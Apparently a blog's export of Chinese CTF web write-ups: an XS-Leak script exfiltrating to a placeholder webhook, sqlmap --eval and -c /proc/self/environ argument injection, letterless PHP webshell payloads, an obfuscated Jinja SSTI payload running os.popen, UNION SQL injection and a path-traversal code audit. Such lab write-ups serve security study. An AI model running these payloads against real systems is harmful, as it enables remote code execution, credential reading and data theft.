[{"content":"web internal_api 打XSLeak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;script\u0026gt; function checkError(url) { // 定义函数，参数应为尝试的新flag（但被错误覆盖） url = \u0026#34;http://127.0.0.1:8000/internal/search?s=\u0026#34; + flag; // 🚨错误：覆盖传入的url参数，实际使用的flag始终是全局变量初始值 let script = document.createElement(\u0026#39;script\u0026#39;) // 创建\u0026lt;script\u0026gt;标签用于发起请求 let ret = false // 🚨未使用的变量 script.src = url // 设置脚本地址（实际为固定地址，无法测试新字符） script.onload = () =\u0026gt; { // 脚本加载成功时触发 fetch(\u0026#34;http://yourwebhook/?flag=\u0026#34; + flag) // 发送当前全局flag到攻击者服务器（但全局flag从未更新） } script.onerror = (e) =\u0026gt; {} // 加载失败不处理（未利用错误信息） document.head.appendChild(script) // 插入脚本以触发请求 } // 定义字符集和已知flag前缀 let charset = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789-}\u0026#39; // 猜测字符范围（包含闭合符}） let flag = \u0026#39;flag{\u0026#39; // Flag的通用开头（CTF常见格式） // 主爆破循环 for (let i = 0; i \u0026lt; charset.length; i++) { // 遍历字符集 let c = charset[i] // 获取当前尝试的字符 let newFlag = flag + c // 组合新flag（如flag{a） checkError(newFlag) // 🚨错误：传入参数未被函数使用，实际所有请求仍为flag{ } \u0026lt;/script\u0026gt; 每次运行爆出一位，然后手动在let flag = \u0026lsquo;flag{\u0026lsquo;后加上即可\n文章 - 浅谈XS-Leaks之Timeless timing attck - 先知社区\nsqlmap-master 先审计代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from fastapi import FastAPI, Request # 导入FastAPI框架及请求对象 from fastapi.responses import FileResponse, StreamingResponse # 导入文件响应和流式响应类 import subprocess # 用于执行系统命令 app = FastAPI() # 创建FastAPI应用实例 @app.get(\u0026#34;/\u0026#34;) # 定义根路径的GET路由 async def index(): return FileResponse(\u0026#34;index.html\u0026#34;) # 返回静态文件index.html（前端页面） @app.post(\u0026#34;/run\u0026#34;) # 定义/run路径的POST路由 async def run(request: Request): # 接收请求对象 data = await request.json() # 异步获取请求的JSON数据 url = data.get(\u0026#34;url\u0026#34;) # 从数据中提取url参数 if not url: # 校验url参数是否存在 return {\u0026#34;error\u0026#34;: \u0026#34;URL is required\u0026#34;} # 返回错误信息 # 构建sqlmap命令（存在安全风险！见下方警告） command = f\u0026#39;sqlmap -u {url} --batch --flush-session\u0026#39; # 直接拼接参数可能导致命令注入漏洞 def generate(): # 定义生成器函数用于流式输出 # 启动子进程执行命令 process = subprocess.Popen( command.split(), # 将命令按空格分割成列表（简单方式，复杂参数可能出错） stdout=subprocess.PIPE, # 捕获标准输出 stderr=subprocess.STDOUT, # 将错误输出合并到标准输出 shell=False # 禁用shell模式（安全最佳实践） ) while True: # 持续读取输出 output = process.stdout.readline() # 逐行读取输出 if output == \u0026#39;\u0026#39; and process.poll() is not None: # 判断进程是否结束 break if output: # 如果有输出内容 yield output # 生成输出内容 # 返回流式响应（实时显示扫描结果） return StreamingResponse(generate(), media_type=\u0026#34;text/plain\u0026#34;) 这里shell=flase,意味内容不会经过 Shell 的语法解析，全被当作参数看待，那就直接找找sqlmap有哪些可以执行命令或者读文件的参数\nsqlmap | GTFOBins\n通过 \u0026ndash;eval 参数可以执⾏ Python 代码, 注意因为上⾯ command.split() 默认是按空格分隔的（所以下面的=号可变空格），注意这⾥参数的值不需要加上单双引号, 因为上⾯已经设置了 shell=False , 如果加上去反⽽代表的是 \u0026ldquo;eval ⼀个 Python 字符串\u0026rdquo;，然后将payload改为紧凑型，避免使用分号。\n最终payload\n最后打127.0.0.1 --eval=__import__('os').system('env')//等号可以变空格\n用法 | sqlmap 用户手册\n翻了翻sqlmap手册，发现-c可以加载配置文件选项、\n所以也可以打\nhttps://localhost?id=1 -c /proc/self/environ //id=1没实际作用，测试时候写的，可以不加\nez_dash misc ","date":"2025-03-26T00:00:00Z","image":"https://luo-kaihong.github.io/p/2025-nctf-web/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E6%B0%9B%E5%9B%B4%E6%84%9F-%E7%BE%8E%E5%A5%B3_hu_b750d4d82fbb9fb6.png","permalink":"https://luo-kaihong.github.io/p/2025-nctf-web/","title":"2025-nctf-web"},{"content":" ez_php 这题前面简单，不多说\n1 2 post传：a[]=1\u0026amp;b[]=2 get传:?password=123456a 解法一日志包含 接下来我打的是日志包含，算是非预期\n各发包2次哈\n解法二打自增 文件包含读取后，有base64字符（还一个非预期直接/file就能出flag）\n1 file=php://filter/read=convert.base64-encode/resource=level2.php 解码得到\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php error_reporting(0); if (isset($_POST[\u0026#39;rce\u0026#39;])) { $rce = $_POST[\u0026#39;rce\u0026#39;]; if (strlen($rce) \u0026lt;= 120) { if (is_string($rce)) { if (!preg_match(\u0026#34;/[!@#%^\u0026amp;*:\u0026#39;\\-\u0026lt;?\u0026gt;\\\u0026#34;\\/|`a-zA-Z~\\\\\\\\]/\u0026#34;, $rce)) { eval($rce); } else { echo(\u0026#34;Are you hack me?\u0026#34;); } } else { echo \u0026#34;I want string!\u0026#34;; } } else { echo \u0026#34;too long!\u0026#34;; } } ?\u0026gt; 这里无字母rce，且过滤了^,~,|,那只能打自增（其实也可以fuzz一下看看可以用哪些）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php // 定义正则表达式 $pattern = \u0026#34;/[a-zA-Z0-9@#%^\u0026amp;*:{}\\-\u0026lt;\\?\u0026gt;\\\u0026#34;|`~\\\\\\\\]/\u0026#34;; // 存储未被过滤的字符 $unfilteredChars = []; // 遍历 ASCII 码从 32 到 127 for ($i = 32; $i \u0026lt;= 127; $i++) { $char = chr($i); // 获取对应的字符 if (!preg_match($pattern, $char)) { // 检查是否未被过滤 $unfilteredChars[] = $char; // 添加到未过滤字符数组 } } // 输出未被过滤的字符 echo \u0026#34;未被过滤的字符: \u0026#34; . implode(\u0026#39;\u0026#39;, $unfilteredChars) . \u0026#34;\\n\u0026#34;; ?\u0026gt; 那显然只能打自增\n自增规则简单，比如$a=\u0026lsquo;A\u0026rsquo;;$a++=\u0026lsquo;B\u0026rsquo;,所以只要一个字母A,我就可以构造一个$_GET,这样就可以给 _ 还有__赋值（这里有数字，但是还是用_,因为我这个照着无数字字母rce打，相当于通用payload），从而到达命令执行的目的,那这个A怎么的得到?\n在php中，数组与字符串连接，会被转换成字符串，值就是Array,那就相对于拿到了所有字母\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php $_=[].\u0026#39;\u0026#39;;//Array $_=$_[\u0026#39;\u0026#39;==\u0026#39;$\u0026#39;];//A $_++;//B $_++;//C $_++;//D $_++;//E $__=$_;//E $_++;//F $_++;//G $___=$_;//G $_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;//T $_=$___.$__.$_;//GET //var_dump($_); $_=\u0026#39;_\u0026#39;.$_;//_GET var_dump($$_[_]($$_[__])); //$_GET[_]($_GET[__]) 接下来就可以尝试去给_和__GET传参，这里我们需要把换行的都去掉，然后进行一次URL编码，因为中间件会解码一次，所以我们构造的payload先变成这样\n1 $_=[].\u0026#39;\u0026#39;;$_=$_[\u0026#39;\u0026#39;==\u0026#39;$\u0026#39;];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_=\u0026#39;_\u0026#39;.$_;$$_[_]($$_[__]); 然后是\n1 %24_%3D%5B%5D.\u0026#39;\u0026#39;%3B%24_%3D%24_%5B\u0026#39;\u0026#39;%3D%3D\u0026#39;%24\u0026#39;%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D\u0026#39;_\u0026#39;.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B 但是这个paylaod不行，因为限制了字符，还是要利用数字，所以应该打$_GET[1] ($_GET[2])\n1 2 3 4 5 6 7 8 9 $_=[]._;//Array $__=$_[1];//r $_=$_[0];//A $_++;//B $_1=++$_;//$_1=C,$_=D(这里是前缀++，即先自增一再赋值) $_++;$_++;$_++;$_++;//$_=H $_=$_1.++$_.$__;//CHr $_=_.$_(71).$_(69).$_(84);//_GET $$_[1]($$_[2]); //$_GET[1]$_GET[2] 1 %24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B%20 这里是118个字符，比较极限，下面更好，只有111字符\n1 2 3 4 5 6 7 8 9 10 11 12 $_=([]._){0}; //A $_++; $_1=++$_; //$_1=C $_++; $_++; $_++; $_++; $_1.=++$_.([]._){1}; //$_1=CHr $_=_.$_1(71).$_1(69).$_1(84); //$_=_GET $$_[1]($$_[2]); //$_GET[1]($_GET[2]) //缩短为一行 $_=([]._){0};$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_1.=++$_.([]._){1};$_=_.$_1(71).$_1(69).$_1(84);$$_[1]($$_[2]); [从CTFShowRCE挑战]中学习自增构造webshell-腾讯云开发者社区-腾讯云\n对于RCE和文件包含的一点总结 | root@wanth3f1ag\n[HNCTF] challenge_rce - Boogiepop Doesn\u0026rsquo;t Laugh\nCoding Loving-ssti 有源码先审计代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 from flask import Flask, request, render_template, session, url_for app = Flask(__name__) app.secret_key = \u0026#39;Ciallo～(∠・ω ＜）⌒★\u0026#39; # 设置应用密钥，用于会话加密 # 定义过滤关键词列表 FILTER_KEYWORDS = [\u0026#39;Ciallo～(∠・ω ＜）⌒★\u0026#39;] TIME_LIMIT = 1 # 时间限制，未在代码中使用 # 定义函数，检查输入中是否包含禁止的关键词 def contains_forbidden_keywords(complaint): for keyword in FILTER_KEYWORDS: if keyword.lower() in complaint: # 检查关键词是否在输入中（不区分大小写） return True return False @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) # 定义路由 \u0026#39;/\u0026#39;，支持 GET 和 POST 方法 def index(): session[\u0026#39;user\u0026#39;] = \u0026#39;test\u0026#39; # 设置会话中的用户为 \u0026#39;test\u0026#39; command = request.form.get(\u0026#39;cmd\u0026#39;, \u0026#39;coding\u0026#39;) # 获取表单中的 \u0026#39;cmd\u0026#39; 值，默认为 \u0026#39;coding\u0026#39; return render_template(\u0026#39;index.html\u0026#39;, command=command) # 渲染 index.html 模板，传递 command 参数 @app.route(\u0026#39;/test\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) # 定义路由 \u0026#39;/test\u0026#39;，支持 GET 和 POST 方法 def shell(): if session.get(\u0026#39;user\u0026#39;) != \u0026#39;test\u0026#39;: # 检查会话中的用户是否为 \u0026#39;test\u0026#39; return render_template(\u0026#39;Auth.html\u0026#39;) # 如果不是，渲染 Auth.html 模板（可能是登录页面） if (abc := request.headers.get(\u0026#39;User-Agent\u0026#39;)) is None: # 获取 User-Agent 头，如果不存在 return render_template(\u0026#39;Auth.html\u0026#39;) # 返回 Auth.html 模板 cmd = request.args.get(\u0026#39;cmd\u0026#39;, \u0026#39;试一试\u0026#39;) # 获取 URL 参数中的 \u0026#39;cmd\u0026#39; 值，默认为 \u0026#39;试一试\u0026#39; if request.method == \u0026#39;POST\u0026#39;: # 如果是 POST 请求 css_url = url_for(\u0026#39;static\u0026#39;, filename=\u0026#39;style.css\u0026#39;) # 生成静态文件 style.css 的 URL command = request.form.get(\u0026#39;cmd\u0026#39;) # 获取表单中的 \u0026#39;cmd\u0026#39; 值 if contains_forbidden_keywords(command): # 检查命令中是否包含禁止的关键词 return render_template(\u0026#39;forbidden.html\u0026#39;) # 如果包含，渲染 forbidden.html 模板 # 使用 render_template_string 渲染一个 HTML 字符串，传递 command 和 css_url 参数 return render_template_string(f\u0026#39;\u0026#39;\u0026#39; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Loving Music\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;{css_url}\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;\u0026lt;url id=\u0026#34;cvh0d9sc75rev485mjl0\u0026#34; type=\u0026#34;url\u0026#34; status=\u0026#34;failed\u0026#34; title=\u0026#34;\u0026#34; wc=\u0026#34;0\u0026#34;\u0026gt;https://fonts.googleapis.com/css2?family=Poppins:wght@400\u0026lt;/url\u0026gt; ;600\u0026amp;display=swap\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Loving coding\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;emoji\u0026#34;\u0026gt;🧑‍💻\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;{command}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;\u0026#39;\u0026#39;, command=command, css_url=css_url) return render_template(\u0026#39;shell.html\u0026#39;, command=cmd) # 如果是 GET 请求，渲染 shell.html 模板，传递 cmd 参数 显然这里漏洞点在render_template_string ，这个与ssti密不可分（render_template_string函数在渲染模板的时候使用了%s来动态的替换字符串，在渲染的时候会把 {undefined{**}} 包裹的内容当做变量解析替换。）\nFlask的渲染方法函数\u0026mdash;render_template()/render_template_string()-CSDN博客\n所以就是打ssti(在/test路由，cmd是参数)，先fuzz一下，这些都是没过滤的\n下面是过滤的（下面还一些关键词，那些无所谓，直接引号绕过了），显然，困难的是数字，下划线过滤了，因为下划线过滤了，一般用request加attr，或者编码，但是数字和点过滤了，这让我束手无策。\n那就直接fenjing跑！\n一开始我直接跑fenjing跑不出，一般默认跑fenjing基本跑不出，要根据题目加点参数才行。这个fenjing跑要带路由，cookie，不然跑不出。这里我猜猜原因，这里设置了seesion会话用户是test，后面还进行了验证，所以要带上seesion才行。\nfenjing如果你是pip下载就打\n1 fenjing crack --url http://node6.anna.nssctf.cn:23137/test --cookies session=eyJ1c2VyIjoidGVzdCJ9.Z-ICRg.6h9VWlD5DS5HIzdu7uCxabtUeVQ --inputs cmd --method POST 不然就命令行前加pyhton -m就行\n1 python -m fenjing crack --url http://node6.anna.nssctf.cn:23137/test --cookies session=eyJ1c2VyIjoidGVzdCJ9.Z-ICRg.6h9VWlD5DS5HIzdu7uCxabtUeVQ --inputs cmd --method POST 然后执行命令就行\n这里给出payload：ls\n1 cmd={{((cycler[\u0026#39;next\u0026#39;][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;GLOBALS\u0026#39;|lower+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;builtins\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;import\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count](\u0026#39;os\u0026#39;))[\u0026#39;popen\u0026#39;](((lipsum()|urlencode|first+\u0026#39;c\u0026#39;)*(x,x,x,x)|count)|format(((x,x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count),(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x,x)|count)*(x,x,x,x,x)|count),((x,x,x,x,x,x,x,x)|count*(x,x,x,x)|count),((x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x)|count))))[\u0026#39;r\u0026#39;\u0026#39;ead\u0026#39;]()}} cat /flag\n1 cmd={{((cycler[\u0026#39;next\u0026#39;][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;GLOBALS\u0026#39;|lower+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;builtins\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;import\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count](\u0026#39;os\u0026#39;))[\u0026#39;popen\u0026#39;](((lipsum()|urlencode|first+\u0026#39;c\u0026#39;)*(x,x,x,x,x,x,x,x,x)|count)|format(((x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x,x,x,x)|count),(((x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x)|count)*(x,x,x,x)|count),((x,x,x,x,x,x,x,x)|count*(x,x,x,x)|count),((x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x)|count),((x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))))[\u0026#39;r\u0026#39;\u0026#39;ead\u0026#39;]()}} 总结，fenjing还是很强，以前不会用，以后注意一定要带上参数\nlight_pink-sql 这题是考sql，但是有非预期\n非预期 拿dirsearch扫一下\n1 python dirsearch.py -u http://node6.anna.nssctf.cn:23588/ db.php没有东西，但是shell.php有好东西\n直接有eval了，我这可以直接打一句话木马了！\n但是！这里有phpinfo!,所以我猜测一下可能会有flag，直接搜flag或者nss，发现flag在环境变量\n预期解 预期解显然就是打sql\n先打1'#%23(%23就是#，\u0026ndash;+被过滤了)\n然后试1' order by 5%23(试到6报错)\n然后看看哪有回显，但是报错，原因是-被禁用\n果然-被禁，结果是4是回显\n1 0\u0026#39; union select 1,2,3,4,5%23 接下来找表\n1 0\u0026#39; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema=database()%23 显示不可以哦=，所以应该是**=被过滤，用like代替**\n1 0\u0026#39; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema like database()%23 查列\n1 0\u0026#39; union select 1,2,3,group_concat(column_name),5 from information_schema.columns where table_name like \u0026#39;Cute\u0026#39;%23 查flag\n1 0\u0026#39; union select 1,2,3,group_concat(Happy),5 from Cute%23 此题过滤了-还有=,但是还是比较友好，毕竟报错还是有提示，是一个不错的sql题\n","date":"2025-03-26T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-nss%23round28-web/","title":"2025-nss#round28-web"},{"content":" ccforum Seay审计一下代码\nadmin.php与config.php存在file_get_content函数，即存在文件读取漏洞，那么先审计admin.php\nadmin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 \u0026lt;?php // 引入配置文件，通常包含数据库连接信息等 require \u0026#39;config.php\u0026#39;; // 检查请求方法是否为POST，如果是，则处理登录逻辑 if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { // 获取POST请求中的用户名和密码，默认值为空字符串 $username = $_POST[\u0026#39;username\u0026#39;] ?? \u0026#39;\u0026#39;; $password = $_POST[\u0026#39;password\u0026#39;] ?? \u0026#39;\u0026#39;; try { // 准备SQL语句，查询admins表中用户名匹配的记录 $stmt = $pdo-\u0026gt;prepare(\u0026#34;SELECT * FROM admins WHERE username = ?\u0026#34;); // 执行查询，传入用户名作为参数 $stmt-\u0026gt;execute([$username]); // 获取查询结果 $admin = $stmt-\u0026gt;fetch(); // 如果查询到管理员且密码验证通过 if ($admin \u0026amp;\u0026amp; password_verify($password, $admin[\u0026#39;password\u0026#39;])) { // 设置会话变量，标识管理员登录状态 $_SESSION[\u0026#39;admin_id\u0026#39;] = $admin[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;admin_username\u0026#39;] = $admin[\u0026#39;username\u0026#39;]; $_SESSION[\u0026#39;admin\u0026#39;] = true; // 记录登录成功的操作日志 log_action($username, \u0026#39;admin_login\u0026#39;, 1); // 重定向到管理员页面 header(\u0026#34;Location: admin.php\u0026#34;); // 终止脚本执行 exit(); } else { // 记录登录失败的操作日志 log_action($username, \u0026#39;admin_login\u0026#39;, 0, \u0026#39;Invalid credentials\u0026#39;); // 输出错误信息并终止脚本 die(\u0026#34;Invalid credentials\u0026#34;); } } catch (PDOException $e) { // 捕获数据库操作异常，记录错误日志 log_action($username, \u0026#39;admin_login\u0026#39;, 0, $e-\u0026gt;getMessage()); // 输出错误信息并终止脚本 die(\u0026#34;Admin login failed: \u0026#34; . $e-\u0026gt;getMessage()); } } // 检查会话中是否没有管理员登录状态，如果是，则拒绝访问 if (!isset($_SESSION[\u0026#39;admin\u0026#39;]) || !$_SESSION[\u0026#39;admin\u0026#39;]) { die(\u0026#34;Access denied. Please login as admin.\u0026#34;); } // 定义操作日志文件路径 $action_log_path = \u0026#39;/var/www/action.log\u0026#39;; // 检查操作日志文件是否存在，如果不存在，则输出错误信息并终止脚本 if (!file_exists($action_log_path)) { die(\u0026#34;Action log file not found.\u0026#34;); } // 读取操作日志文件内容 $action_log = file_get_contents($action_log_path); // 将日志内容按行分割成数组 $log_lines = explode(\u0026#34;\\n\u0026#34;, $action_log); // 初始化被封禁用户和失败日志数组 $banned_users = []; $failed_logs = []; // 遍历每一行日志 foreach ($log_lines as $line) { // 如果行为空，跳过 if (empty($line)) { continue; } // 按逗号分割日志行 $parts = explode(\u0026#39;,\u0026#39;, $line); // 如果分割后的部分数量不足5个，跳过 if (count($parts) \u0026lt; 5) { continue; } // 获取编码后的用户名、操作类型、成功状态和附加信息 $encoded_user = $parts[1]; $action = $parts[2]; $success = (int) $parts[3]; $additional_info = $parts[4]; //总结上面的代码就是获取/var/www/action.log给action_log，再用，分割成part // 如果操作类型是记录封禁 if ($action === \u0026#39;record_banned\u0026#39;) { // 如果操作成功 if ($success === 1) { // 将附加信息添加到被封禁用户数组中 $banned_users[$encoded_user][] = $additional_info; } else { // 将附加信息添加到失败日志数组中 $failed_logs[] = $additional_info; } } } //这里要求action==record_banned,success=1,然后进行下面的遍历文件目录的内容全部传给参数， 所以如果构造{$encoded_user}为../../../,就相当与回到根目录，从而可能读到flag // 初始化被封禁内容数组 $banned_contents = []; // 遍历被封禁用户数组 foreach ($banned_users as $encoded_user =\u0026gt; $logs) { // 构造被封禁用户目录路径 $banned_dir = \u0026#34;/var/www/banned/{$encoded_user}\u0026#34;;//构造{$encoded_user}为../../../，之后直接读根目录 // 如果目录存在 if (file_exists($banned_dir)) { // 获取目录中的文件列表 $files = scandir($banned_dir); // 遍历文件列表 foreach ($files as $file) { // 跳过目录本身和父目录 if ($file !== \u0026#39;.\u0026#39; \u0026amp;\u0026amp; $file !== \u0026#39;..\u0026#39;) { // 构造文件路径 $file_path = $banned_dir . \u0026#39;/\u0026#39; . $file; // 读取文件内容 $content = file_get_contents($file_path); // 将内容添加到被封禁内容数组中 $banned_contents[$username][] = $content; } } } } ?\u0026gt; 接下来要知道action.log的内容，所以先看看config.php文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 // 启动会话 session_start(); // 定义数据库连接参数 define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;127.0.0.1\u0026#39;); define(\u0026#39;DB_PORT\u0026#39;, \u0026#39;3306\u0026#39;); define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;forum\u0026#39;); define(\u0026#39;DB_USER\u0026#39;, \u0026#39;mgr\u0026#39;); define(\u0026#39;DB_PASS\u0026#39;, \u0026#39;j92wn0UXFYsUAFiN\u0026#39;); try { // 创建PDO实例，连接到MySQL数据库 $pdo = new PDO( \u0026#34;mysql:host=\u0026#34; . DB_HOST . \u0026#34;;port=\u0026#34; . DB_PORT . \u0026#34;;dbname=\u0026#34; . DB_NAME, DB_USER, DB_PASS, [PDO::ATTR_ERRMODE =\u0026gt; PDO::ERRMODE_EXCEPTION] // 设置错误模式为异常 ); } catch (PDOException $e) { // 如果连接失败，输出错误信息并终止脚本 die(\u0026#34;Database connection failed: \u0026#34; . $e-\u0026gt;getMessage()); } // 定义一个函数，用于对用户名进行Base64编码 function encode_uname($username) { return base64_encode($username); } // 定义一个函数，用于记录操作日志 function log_action($username, $action, $succ, $additional = \u0026#39;\u0026#39;) { // 生成唯一的日志ID $log_id = uniqid(); // 对用户名进行编码 $e_username = encode_uname($username); // 格式化日志行 $log_line = sprintf( \u0026#34;%s,%s,%s,%d,%s\\n\u0026#34;, $log_id, $e_username, $action, $succ, $additional ); // 将日志行追加到操作日志文件中 file_put_contents(\u0026#39;/var/www/action.log\u0026#39;, $log_line, FILE_APPEND); } // 定义一个函数，用于记录封禁操作 function record_banned($username, $banned) { // 对用户名进行编码 $e_username = encode_uname($username); // 构造被封禁用户目录路径 $banned_dir = \u0026#34;/var/www/banned/{$e_username}\u0026#34;; // 假设目录创建成功 $created = true; // 如果目录不存在，则尝试创建 if (!file_exists($banned_dir)) { $created = mkdir($banned_dir, 0750); // 设置目录权限为0750 } // 初始化日志信息和成功状态 $log = \u0026#34;\u0026#34;; $succ = 1; // 如果目录创建失败 if (!$created) { $succ = 0; // 设置成功状态为失败 $log = \u0026#34;Failed to create record directory for \u0026#34; . $username; // 记录错误信息 } else { // 构造文件名，使用当前时间戳 $filename = $banned_dir . \u0026#39;/\u0026#39; . time() . \u0026#39;.txt\u0026#39;; // 尝试将封禁内容写入文件 if (!file_put_contents($filename, $banned)) { $succ = 0; // 如果写入失败，设置成功状态为失败 $log = \u0026#34;Failed to record banned content\u0026#34;; // 记录错误信息 } } // 调用log_action函数记录封禁操作的日志 log_action($username, \u0026#39;record_banned\u0026#39;, $succ, $log); } // 定义一个函数，用于检查内容是否包含敏感词 function has_sensitive_words($content) { // 定义敏感词列表 $SENSITIVE_WORDS = [\u0026#39;敏感词\u0026#39;, \u0026#39;SENSITIVE WORDS\u0026#39;,]; // 遍历敏感词列表 foreach ($SENSITIVE_WORDS as $word) { // 使用stripos函数（不区分大小写）检查内容中是否包含敏感词 if (stripos($content, $word) !== false) { // 如果找到敏感词，返回true return true; } } // 如果没有找到敏感词，返回false return false; } 首先看log_action函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 